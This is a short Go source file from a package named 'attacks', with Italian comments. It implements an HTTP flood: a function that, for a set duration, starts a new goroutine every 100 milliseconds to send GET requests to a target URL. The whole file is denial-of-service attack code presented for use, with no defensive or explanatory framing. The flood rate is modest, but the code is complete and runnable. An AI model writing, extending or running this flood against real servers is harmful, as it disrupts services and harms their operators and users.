package attacks

import (
	"fmt"
	"net/http"
	"time"
)

// SendHTTPRequest invia richieste HTTP al server target.
func SendHTTPRequest(url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("HTTP GET request failed: %w", err)
	}
	defer resp.Body.Close()
	return nil
}

// RunHTTPFlood esegue un flood HTTP verso il target.
func RunHTTPFlood(url string, duration time.Duration) {
	endTime := time.Now().Add(duration)
	for time.Now().Before(endTime) {
		go func() {
			err := SendHTTPRequest(url)
			if err != nil {
				fmt.Println("HTTP request failed:", err)
			}
		}()
		time.Sleep(time.Millisecond * 100) // Adjust frequency as needed
	}
}
